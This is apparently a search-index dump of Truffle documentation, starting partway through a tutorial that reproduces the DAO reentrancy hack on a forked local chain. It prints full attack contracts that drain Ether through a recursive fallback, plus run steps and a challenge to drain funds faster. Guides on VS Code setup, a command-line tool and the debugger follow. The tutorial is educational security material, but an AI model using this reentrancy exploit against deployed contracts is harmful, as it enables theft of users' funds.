alter its timestamp by 86400 seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached.","title":"Step 3: Wait for the presale to end"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-4-deploy-our-hack-contract-to-the-network","text":"This hack contract was written by me, but it was heavily influenced by this writeup written by Phil Daian from Hacking, Distributed . Many thanks go to him for such a clear writeup. From Github: ./contracts/Hack.sol import \"DAOInterface.sol\" ; contract Proxy { DAOInterface DAO ; address owner ; function Proxy ( address _dao ) { owner = msg.sender ; DAO = DAOInterface ( _dao ); } function empty () { if ( msg.sender != owner ) return ; uint balance = DAO . balanceOf ( this ); DAO . transfer ( owner , balance ); } } contract Hack { uint public proposalID ; DAOInterface public DAO ; uint public calls_to_make ; uint public calls ; Proxy public proxy ; function Hack ( address _dao ) { DAO = DAOInterface ( _dao ); calls = 0 ; proxy = new Proxy ( _dao ); calls_to_make = 1 ; } function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } function voteYesOnProposal () { DAO . vote ( proposalID , true ); } function fillProxy () { uint balance = DAO . balanceOf ( this ); DAO . transfer ( address ( proxy ), balance ); } function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } } First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they're stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely. makeSplitProposal() , voteYesOnProposal() , and splitDAO() (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later. fillProxy() takes the Hack contract's DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, proxy.empty() returns the tokens back to the Hack contract. runHack() gets the hack started, and the fallback function function() {...} runs the hack until we've reached the maximum amount of calls we can make within our given gas limit.","title":"Step 4: Deploy our hack contract to the network"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-5-transfer-dao-tokens-to-hack-contract","text":"Now that our Hack contract is deployed, we need to transfer the DAO balance from accounts[0] to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle: DAO . transfer ( Hack . address , balances . accountDAO , { from : accounts [ 0 ]}). then ( function () { callback (); }). catch ( callback );","title":"Step 5: Transfer DAO tokens to Hack contract"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-6-make-a-split-proposal","text":"Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you'll be able to move your Ether into your own DAO. I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO's newProposal() function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including this wiki page , this wiki page , this wiki page as well as the DAO code itself (to future developers, I'd highly recommend encapsulating the complexity if you have two \"things\" of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function: function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } Couple points here: The first input is the recipient of the proposal -- or in our case, the curator of the new DAO that's created -- which is the Hack contract itself. 0x0 is the amount of Ether to send with the proposal. We're told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically. \"Lonely, so Lonely\" is a short description of the proposal. This is the same description the original attacker used, so it's only fitting to use it ourselves as well. transactionData is any extra input used to call functions on the proposal's contract were this a real proposal. Since this is a split we're supposed to leave it blank, but the only way to do so is to create a new bytes type in memory and pass that empty type along. 0x93a80 is one week in seconds, converted to hexadecimal. true means we're actually splitting, and not creating a normal proposal. When I executed the above function from Javascript I also watched for the ProposalAdded event fired off by the DAO, which told me the id of the proposal created. You can see how I did that in the script .","title":"Step 6: Make a split proposal"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-7-vote-yes-on-the-proposal","text":"This is a simple function call. Like the makeSplitProposal() function above, the voteYesOnProposal() function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it's encapsulated in the Hack contract, it's as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted: function voteYesOnProposal () { DAO . vote ( proposalID , true ); }","title":"Step 7: Vote yes on the proposal"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-8-wait-a-week","text":"The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I'll leave that as an exercise for the reader, or you can just review the script .","title":"Step 8: Wait a week"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-9-perform-our-first-split","text":"The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO's address that we can later use to show our total bounty. We've set up the hack contract to only make one split the first time we call splitDAO() (see calls and calls_to_make ; calls_to_make defaulted to 1 when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we'd trigger the hack by continuing to make splits from the fallback function. function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } Like when we created a proposal we also wait for an event here, this time the Transfer event, but again you can see how we did that within the script .","title":"Step 9: Perform our first split"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-10-run-the-hack","text":"This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts. function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } The execution logic looks like this: Call runHack() to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don't go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the splitDAO() function is called, eventually calling DAO.splitDAO() , which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it's the action of sending the reward -- _recipient.call.value(_amount)() in ManagedAccount.sol -- that enables us to perform the rest of the hack. Sending the reward to the Hack contract triggers the Hack contract's fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn't made too many, it then calls another split via the splitDAO() function. If it has called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract's balance as zero. The execution will loop in this way -- split, fallback function, split, fallback function -- until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether. You can see via the script where the balance goes. After each set of iterations -- in our case, 26 iterations per set -- you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at Hacking, Distributed for this revelation .","title":"Step 10: Run the hack"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#running-the-script","text":"As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies: $ git clone https://github.com/tcoulter/dao-truffle $ cd dao-truffle $ npm install Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First install Truffle then run: $ truffle compile From here, you can run the script by simply running: $ node index.js And now you've exploited the DAO. Cheers!","title":"Running the script"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#but-dynamic-analysis","text":"Of course you might be asking, \"How does this apply to dynamic analysis? You've only shown me how to exploit the DAO!\" Yes, that's true, but dynamic analysis was the trojan horse. Because this hack can be made better , to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I've provided you. You've been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out? As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so... $ testrpc --fork http://127.0.0.1:8545@1599200 ... and then use Truffle's console to interact with the DAO directly: $ truffle console Good luck, and may all your code be secure!","title":"But, Dynamic Analysis?"},{"location":"guides/configuring-visual-studio-code/index.html","text":"This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! Visual Studio code is a great tool for editing Solidity smart contracts, and is available on Windows, Mac & Linux. There is a great plugin that enables Syntax highlighting, snippets, and compiling of the current contract (if you aren\u2019t using an external tool) https://github.com/juanfranblanco/vscode-solidity/ This configuration works really well with Truffle (as shown in the final screenshot). You can read how to install Truffle on Windows in my previous post . Step 1: Install Visual Studio code \u00b6 https://code.visualstudio.com/ Easy option on Windows: Just install via https://chocolatey.org/ by using the command choco install VisualstudioCode \u2013y Step 2: Install Visual Studio extensions \u00b6 Go into the extensions section, then install these plugins: Solidity Material Icon Theme Step 3: Enable icon theme \u00b6 Select File \u2013> Preferences \u2013> File Icon Theme . Final result: Sexy workspace \u00b6","title":"Configuring Visual Studio code for Ethereum Blockchain Development"},{"location":"guides/configuring-visual-studio-code/index.html#step-1-install-visual-studio-code","text":"https://code.visualstudio.com/ Easy option on Windows: Just install via https://chocolatey.org/ by using the command choco install VisualstudioCode \u2013y","title":"Step 1: Install Visual Studio code"},{"location":"guides/configuring-visual-studio-code/index.html#step-2-install-visual-studio-extensions","text":"Go into the extensions section, then install these plugins: Solidity Material Icon Theme","title":"Step 2: Install Visual Studio extensions"},{"location":"guides/configuring-visual-studio-code/index.html#step-3-enable-icon-theme","text":"Select File \u2013> Preferences \u2013> File Icon Theme .","title":"Step 3: Enable icon theme"},{"location":"guides/configuring-visual-studio-code/index.html#final-result-sexy-workspace","text":"","title":"Final result: Sexy workspace"},{"location":"guides/creating-a-cli-with-truffle-3/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Truffle 3 is out , and it switched to a less opinionated build process. In Truffle 2, the default app from truffle init included a frontend example with build process. Now, there's nothing other than a build folder for your JSON contract artifacts. This opens up the door for testing and building other ( cough command line cough ) types of applications! Intended Audience \u00b6 This is written for those familiar with Truffle and Ethereum, who want to learn how to create a testable, Ethereum-enabled command line application with Truffle. For this tutorial, we'll be building a command line tool that interacts with the Ethereum Name Service (ENS). Getting Started \u00b6 If you were using Truffle beta 3.0.0-9 or below, do not immediately upgrade . Read these release notes and the upgrade guide first. Next, make a new folder and run the following command: $ truffle init You should see the test , build , and migrations directories were created for you -- but no app . Additionally, the build step in the truffle.js file is mysteriously absent. That's ok! This means Truffle is getting out of your way and letting you control the build process. Let's Look at the Example \u00b6 Check out the example app as a reference. I'll be referring to it often so give it a look over if you haven't already. The first thing to look at is the build process. Since Truffle now puts us in control of the build, I've added some custom scripts within package.json to handle building for us: ... \"description\" : \"CLI for ENS deployment\" , \"scripts\" : { \"ens\" : \"babel-node ./bin/ensa.js\" , \"lint\" : \"eslint ./\" }, \"author\" : \"Douglas von Kohorn\" , \"license\" : \"MIT\" , ... I've defined two scripts here: lint for linting my Javascript to keep my codebase so fresh and so clean, and ens for transpiling my Javascript command line tool (using Babel) and running it. That's it! That's the build process. You can run it via npm run lint and npm run ens . Now that that's out of the way, let's dig into how and why I structured my app this way. Building our App: Separation of concerns \u00b6 In order to take advantage of all parts of Truffle while building this tool, we need to separate our code into two distinct pieces. First, we need to write a library which will constitute the bulk of the app, and allow us to perform actions against the ENS contracts quickly and easily from Javascript. Next is the CLI; the CLI will take advantage of the library itself, and will be the user's interface to our application. The Library \u00b6 The library is lib/ens_registrar.js . Let's take a look at the constructor: ... constructor ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) { this . web3 = new Web3 ( provider ) this . Deed = Deed this . Deed . setProvider ( provider ) AuctionRegistrar . setProvider ( provider ) AuctionRegistrar . defaults ({ from : fromAddress , gas : 400000 }) this . registrar = AuctionRegistrar . at ( registrarAddress ) } ... The library constructor requires a few things: the contract interfaces ( AuctionRegistrar & Deed ) the address on the network of the registrar a web3 provider that will be used to connect to the desired Ethereum network and the account address that will provide gas for transactions. It's crucial that the library remain ignorant of the creation of these variables if we want to take advantage of both Truffle's testing pipeline and a CLI. As I see it, there are two ways to use the library: - Through Truffle , which manages contract addresses for testing against different networks (e.g. local, private, ropsten). Truffle makes testing our library easy. - Once we've convinced ourselves that the library is well tested and works properly, we'll want to tell the library where to find our own contracts, provider, and account on the mainnet through the CLI . Let's take a look at how the library is used in both cases. Use #1: Truffle Tests \u00b6 Here's test/ENS.js , a Truffle test that uses the library: import { default as ENSAuctionLib } from '../lib/ens_registrar' const Registrar = artifacts . require ( './Registrar.sol' ) const Deed = artifacts . require ( './Deed.sol' ) contract ( 'ENS integration' , ( accounts ) => { let auctionRegistrar before ( 'set up auction registrar' , ( done ) => { Registrar . deployed (). then (( instance ) => { auctionRegistrar = new ENSAuctionLib ( Registrar , Deed , instance . address , web3 . currentProvider , accounts [ 0 ] ) }). then (() => done ()) }) it ( 'demonstrates that the domain name is available' , ( done ) => { auctionRegistrar . available ( 'test' ) . then (( isAvailable ) => { assert . isTrue ( isAvailable ) done () }) }) ... } Truffle injects a global artifacts.require function, a helper for finding the right compiled contract artifacts within the test environment. The test then finds a deployed instance of the Registrar on the test network via Registrar.deployed() . Now, with the addition of accounts , which is passed in via the contract wrapper (see here) , we have enough to instantiate the library and use it to test that the domain name 'test' is available for auction. Use #2: the CLI \u00b6 Here's index.js , which provides our command line tool, using the library: import { default as ENSAuctionLib } from './lib/ens_registrar' import { default as Web3 } from 'web3' import { default as contract } from '@truffle/contract' const AuctionRegistrar = contract ( require ( './build/contracts/Registrar.json' )) const Deed = contract ( require ( './build/contracts/Deed.json' )) export default function ( host , port , registrarAddress , fromAddress ) { let provider = new Web3 . providers . HttpProvider ( `http:\\/\\/ ${ host } : ${ port } ` ) return new ENSAuctionLib ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) } Here I'm using the same library, @truffle/contract , that artifacts.require uses under the hood. Because I can't rely on the Truffle framework within the CLI, I have to include the compiled contract artifacts manually. The rest is passed in through the CLI in bin/ensa.js : import { default as initializeLib } from '../index' ... let command = argv . _ [ 0 ] if ( command === 'bid' ) { let { name , host , max , port , registrar , account , secret } = argv let auctionRegistrar = initializeLib ( host , port , registrar , account ) auctionRegistrar . createBid ( name , account , max , secret ) . then (() => console . log ( 'Created bid for ' + name )) } Usage \u00b6 You can use the command line tool against any network that has an ENS registrar deployed. First, choose a command: $ npm run -s ens Usage: bin/ensa.js [ command ] [ options ] Commands: winner Current winner of bid bid Place a bid on a domain name reveal Reveal your bid on a domain name Options: --help Show help Then specify the correct options, including the account and registrar : $ npm run -s ens -- winner -n 'NewDomain' bin/ensa.js winner Options: --help Show help [ boolean ] --host, -h HTTP host of Ethereum node [ default: \"testrpc\" ] --port, -p HTTP port [ default: \"8545\" ] --registrar, -r The address of the registrar [ string ] [ required ] --name, -n The name you want to register [ string ] [ required ] --account, -a The address to register the domain name [ string ] [ required ] Missing required arguments: account, registrar Recap \u00b6 You might be thinking to yourself, \"That was a short tutorial\". That's because it doesn't need to be much longer: Creating a command line application with Truffle is very similar to creating a web application, but you have to do things a bit differently. For instance, instead of a build process, your command line tool needs to grab your contract artifacts and make them ready for use. Additionally, if you want to take advantage of Truffle's tests, you need to separate your code into a command line interface and a library -- a good practice anyway -- so you can use Truffle's testing framework to test your code. Stay Tuned \u00b6 Truffle 3.0 now makes it easier than ever to write any Ethereum-enabled application, and not just web apps. Stay tuned for more examples in the future where we explore Desktop and Mobile applications, too. Cheers!","title":"Creating an Ethereum-enabled command line tool with Truffle 3.0"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#intended-audience","text":"This is written for those familiar with Truffle and Ethereum, who want to learn how to create a testable, Ethereum-enabled command line application with Truffle. For this tutorial, we'll be building a command line tool that interacts with the Ethereum Name Service (ENS).","title":"Intended Audience"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#getting-started","text":"If you were using Truffle beta 3.0.0-9 or below, do not immediately upgrade . Read these release notes and the upgrade guide first. Next, make a new folder and run the following command: $ truffle init You should see the test , build , and migrations directories were created for you -- but no app . Additionally, the build step in the truffle.js file is mysteriously absent. That's ok! This means Truffle is getting out of your way and letting you control the build process.","title":"Getting Started"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#lets-look-at-the-example","text":"Check out the example app as a reference. I'll be referring to it often so give it a look over if you haven't already. The first thing to look at is the build process. Since Truffle now puts us in control of the build, I've added some custom scripts within package.json to handle building for us: ... \"description\" : \"CLI for ENS deployment\" , \"scripts\" : { \"ens\" : \"babel-node ./bin/ensa.js\" , \"lint\" : \"eslint ./\" }, \"author\" : \"Douglas von Kohorn\" , \"license\" : \"MIT\" , ... I've defined two scripts here: lint for linting my Javascript to keep my codebase so fresh and so clean, and ens for transpiling my Javascript command line tool (using Babel) and running it. That's it! That's the build process. You can run it via npm run lint and npm run ens . Now that that's out of the way, let's dig into how and why I structured my app this way.","title":"Let's Look at the Example"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#building-our-app-separation-of-concerns","text":"In order to take advantage of all parts of Truffle while building this tool, we need to separate our code into two distinct pieces. First, we need to write a library which will constitute the bulk of the app, and allow us to perform actions against the ENS contracts quickly and easily from Javascript. Next is the CLI; the CLI will take advantage of the library itself, and will be the user's interface to our application.","title":"Building our App: Separation of concerns"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#the-library","text":"The library is lib/ens_registrar.js . Let's take a look at the constructor: ... constructor ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) { this . web3 = new Web3 ( provider ) this . Deed = Deed this . Deed . setProvider ( provider ) AuctionRegistrar . setProvider ( provider ) AuctionRegistrar . defaults ({ from : fromAddress , gas : 400000 }) this . registrar = AuctionRegistrar . at ( registrarAddress ) } ... The library constructor requires a few things: the contract interfaces ( AuctionRegistrar & Deed ) the address on the network of the registrar a web3 provider that will be used to connect to the desired Ethereum network and the account address that will provide gas for transactions. It's crucial that the library remain ignorant of the creation of these variables if we want to take advantage of both Truffle's testing pipeline and a CLI. As I see it, there are two ways to use the library: - Through Truffle , which manages contract addresses for testing against different networks (e.g. local, private, ropsten). Truffle makes testing our library easy. - Once we've convinced ourselves that the library is well tested and works properly, we'll want to tell the library where to find our own contracts, provider, and account on the mainnet through the CLI . Let's take a look at how the library is used in both cases.","title":"The Library"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#use-1-truffle-tests","text":"Here's test/ENS.js , a Truffle test that uses the library: import { default as ENSAuctionLib } from '../lib/ens_registrar' const Registrar = artifacts . require ( './Registrar.sol' ) const Deed = artifacts . require ( './Deed.sol' ) contract ( 'ENS integration' , ( accounts ) => { let auctionRegistrar before ( 'set up auction registrar' , ( done ) => { Registrar . deployed (). then (( instance ) => { auctionRegistrar = new ENSAuctionLib ( Registrar , Deed , instance . address , web3 . currentProvider , accounts [ 0 ] ) }). then (() => done ()) }) it ( 'demonstrates that the domain name is available' , ( done ) => { auctionRegistrar . available ( 'test' ) . then (( isAvailable ) => { assert . isTrue ( isAvailable ) done () }) }) ... } Truffle injects a global artifacts.require function, a helper for finding the right compiled contract artifacts within the test environment. The test then finds a deployed instance of the Registrar on the test network via Registrar.deployed() . Now, with the addition of accounts , which is passed in via the contract wrapper (see here) , we have enough to instantiate the library and use it to test that the domain name 'test' is available for auction.","title":"Use #1: Truffle Tests"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#use-2-the-cli","text":"Here's index.js , which provides our command line tool, using the library: import { default as ENSAuctionLib } from './lib/ens_registrar' import { default as Web3 } from 'web3' import { default as contract } from '@truffle/contract' const AuctionRegistrar = contract ( require ( './build/contracts/Registrar.json' )) const Deed = contract ( require ( './build/contracts/Deed.json' )) export default function ( host , port , registrarAddress , fromAddress ) { let provider = new Web3 . providers . HttpProvider ( `http:\\/\\/ ${ host } : ${ port } ` ) return new ENSAuctionLib ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) } Here I'm using the same library, @truffle/contract , that artifacts.require uses under the hood. Because I can't rely on the Truffle framework within the CLI, I have to include the compiled contract artifacts manually. The rest is passed in through the CLI in bin/ensa.js : import { default as initializeLib } from '../index' ... let command = argv . _ [ 0 ] if ( command === 'bid' ) { let { name , host , max , port , registrar , account , secret } = argv let auctionRegistrar = initializeLib ( host , port , registrar , account ) auctionRegistrar . createBid ( name , account , max , secret ) . then (() => console . log ( 'Created bid for ' + name )) }","title":"Use #2: the CLI"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#usage","text":"You can use the command line tool against any network that has an ENS registrar deployed. First, choose a command: $ npm run -s ens Usage: bin/ensa.js [ command ] [ options ] Commands: winner Current winner of bid bid Place a bid on a domain name reveal Reveal your bid on a domain name Options: --help Show help Then specify the correct options, including the account and registrar : $ npm run -s ens -- winner -n 'NewDomain' bin/ensa.js winner Options: --help Show help [ boolean ] --host, -h HTTP host of Ethereum node [ default: \"testrpc\" ] --port, -p HTTP port [ default: \"8545\" ] --registrar, -r The address of the registrar [ string ] [ required ] --name, -n The name you want to register [ string ] [ required ] --account, -a The address to register the domain name [ string ] [ required ] Missing required arguments: account, registrar","title":"Usage"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#recap","text":"You might be thinking to yourself, \"That was a short tutorial\". That's because it doesn't need to be much longer: Creating a command line application with Truffle is very similar to creating a web application, but you have to do things a bit differently. For instance, instead of a build process, your command line tool needs to grab your contract artifacts and make them ready for use. Additionally, if you want to take advantage of Truffle's tests, you need to separate your code into a command line interface and a library -- a good practice anyway -- so you can use Truffle's testing framework to test your code.","title":"Recap"},{"location":"guides/creating-a-cli-with-truffle-3/index.html#stay-tuned","text":"Truffle 3.0 now makes it easier than ever to write any Ethereum-enabled application, and not just web apps. Stay tuned for more examples in the future where we explore Desktop and Mobile applications, too. Cheers!","title":"Stay Tuned"},{"location":"guides/debugger-variable-inspection/index.html","text":"Note : This tutorial requires Truffle version 4.1.8 or newer. The integrated Solidity debugger in Truffle is a powerful tool for inspecting your contracts. When initially released, the debugger had the ability to to step through Solidity code, but that was it. But development has continued apace, and new functionality has been added to make your contract inspection more powerful. Specifically, you now have the ability to perform variable inspection on your contracts . With this, you can know exactly the state of your variables at every given point in the instruction list, giving you a much greater ability to truly inhabit the current state of your contracts, and making debugging a breeze. In this tutorial, we're going to take a look at a simple contract and inspect it using the Truffle Solidity debugger. We'll investigate three scenarios: A working contract A working contract with unexpected output A broken contract A basic smart contract \u00b6 The Fibonacci sequence is an integer sequence where each successive number in the sequence is the sum of the two previous numbers. With the first two numbers set to 1, you can determine every number in the sequence through iteration. The Fibonacci sequence is related to the \"golden ratio\", which is found in certain areas of nature, such as governing the the arrangement of leaves on branches and petals on flowers. The golden ratio in nature: flower petals. (Source: Flickr ) Generating the Fibonacci sequence with a smart contract can show off the debugger and its variable inspection without getting too bogged down in details. Let's do it. Create a new project directory called fibonacci and change into it. mkdir fibonacci cd fibonacci Create a bare truffle project: truffle init In the contracts/ directory, create a file named Fibonacci.sol and add the following content: pragma solidity ^ 0.4.22 ; contract Fibonacci { uint [] fibseries ; // n = how many in the series to return function generateFib ( uint n ) public { // set 1st and 2nd entries fibseries . push ( 1 ); fibseries . push ( 1 ); // generate subsequent entries for ( uint i = 2 ; i < n ; i ++ ) { fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); } } } Let's take a look at this contract to see what's going on with it: First, we see the standard pragma declaration, which states that the contract s compatible with any 0.4.x version of Solidity newer than 0.4.22. The contract name is called Fibonacci . We're defining an array of integers called fibseries . This will house our Fibonacci series. Note that the variable declaration is happening outside of any function, and therefore the array will be saved in storage (instead of memory), provoking a transaction to occur when the contract is run. The function is called generateFib and takes a single argument, which is the number of integers in the sequence to generate. The next two commands add an element each to the array via the .push() method. As we know our fibseries array is defined in storage, but size isn't known until runtime, the .push() method is used to add entries to (the end of) our array. This starts the sequence with the number 1 twice. The for loop iterates through the rest of the array (as determined by the integer n ) filling each entry with the appropriate value. Inside the migrations/ directory of your project, create a file called 2_deploy_contracts.js and populate it with the following content: var Fibonacci = artifacts . require ( \"Fibonacci\" ); module . exports = function ( deployer ) { deployer . deploy ( Fibonacci ); }; This file allows us to deploy the Fibonacci contract (shown above) to the blockchain. Now launch Ganache . This will be the personal blockchain we'll use to deploy our contract. Ganache Note : You can also run this tutorial with [Truffle Develop](/docs/getting_started/console) and the results will be the same. In the root of your project, open your truffle.js file and add the following content: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This allows us to connect our project to Ganache. Launch the Truffle console : truffle console You will see a prompt: truffle ( development ) > We'll run all of our commands from here. Compile the contract: compile You should see the following output: Compiling .\\contracts\\Fibonacci.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts Note : Make sure to examine the output for any errors or warnings. Migrate the contract to our blockchain. migrate You will see output that looks like this, though the addresses and transaction IDs will be different: Using network 'development'. Running migration: 1_initial_migration.js Replacing Migrations... ... 0xd29465deee7a5d60aed89520807432ef8a2fbbb665611882277ec8ca6fc9c622 Migrations: 0x5cc77b19b8e14e4d6074562bdbe1e13e1b793693 Saving successful migration to network... ... 0xba700ad46880ab2a9bdd961e66c9313fc541f91c439243df6ab2b97920cf2c4a Saving artifacts... Running migration: 2_deploy_contracts.js Replacing Fibonacci... ... 0xed0d1b736e948d926ee31f959b013f67d71e08f294a87e86e41ccbd8a62ce908 Fibonacci: 0xa3f4063ffbdc5cfd8ecbd99424378a5f056eb81d Saving successful migration to network... ... 0xcaeb44f5e28689c29cb3189c7b42fa1094021b4e5008f720fef2f9b867e6be23 Saving artifacts... Interacting with the basic smart contract \u00b6 Our contract is now on the blockchain. Ganache has automatically mined the transactions that came from the contract call and creation, as you can see by clicking the \"Transactions\" button in Ganache: Ganache transactions Now it's time to interact with the contract. First we'll check to make sure that it's working correctly. In the Truffle console, enter the following command: Fibonacci . deployed (). then ( function ( instance ){ return instance . generateFib ( 10 );}); Before we run the command, let's take a look at it in greater detail. Displayed in a more easily-readable manner, it reads: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); This command uses JavaScript promises . Specifically, the command says that given a deployed version of the Fibonacci contract, run an instance of that contract, and then run the generateFib function from that contract, passing it the argument 10 . Run the above command. A transaction will be created on the blockchain because our array that holds the generated Fibonacci sequence is in storage. Because of this, the output of the console will be the transaction details, which will look similar to this: { tx : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , receipt : { transactionHash : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , transactionIndex : 0 , blockHash : '0x88d45cb84d1f26001b0e7ae2931a56dfc0a592a1d0437fe0a37540d65f49a2ed' , blockNumber : 5 , gasUsed : 298373 , cumulativeGasUsed : 298373 , contractAddress : null , logs : [], status : '0x01' , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' }, logs : [] } The important part of this output for us is the transaction ID (listed as the value of tx: ). Because even though we've run our function, we don't actually know what happened. Did it work correctly? Did something unexpected happen? We'll need the Truffle Solidity debugger to find out. Note : Your transaction ID will be different from the above. Debugging a transaction \u00b6 You can debug a transaction in the Truffle console by typing debug <transactionID> . We'll now do just that. Type debug and then the value of tx: found in your transaction details. For example: debug 0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c Note : Your transaction ID will be different. Do not copy the above example exactly. This will enter the debugger. You will see the following output: Gathering transaction data ... Addresses affected : 0x33b217190208f7b8d2b14d7a30ec3de7bd722ac6 - Fibonacci Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit ( b ) toggle breakpoint , ( c ) continue until breakpoint ( + ) add watch expression ( ` + : < expr > ` ), ( - ) remove watch expression ( - : < expr > ) ( ? ) list existing watch expressions ( v ) print variables and values , (:) evaluate expression - see ` v ` Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > Let's examine what's going on here. The debugger names the address of the contract in question that is related to the transaction, as well as the name of that contract. In our case, we're only dealing with a single contract, though if our transaction dealt with multiple contracts, all addresses would be shown. A full list of commands for the debugger is shown. Many of these mirror other code debuggers. We'll use a few of these throughout the tutorial, but if you ever want to see the list again, type h . The debugger starts at the first instruction of the transaction, and shows you the relevant code for that instruction, highlighted with carets ( ^^^ ). Type n and <Enter> to step next. This will move to the next instruction: 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > We've seen in the previous tutorial on debugging how you can step through the instructions to debug your contract. But here, we have an additional concern, which is that we don't actually know the outcome of our function call; we want to know what a variable is set to. You can view the state of all known variables by pressing v : fibseries : [] debug ( development : 0xf47f01da ...) > Here we see one empty array. The arry fibseries will have the n numbers in the Fibonacci 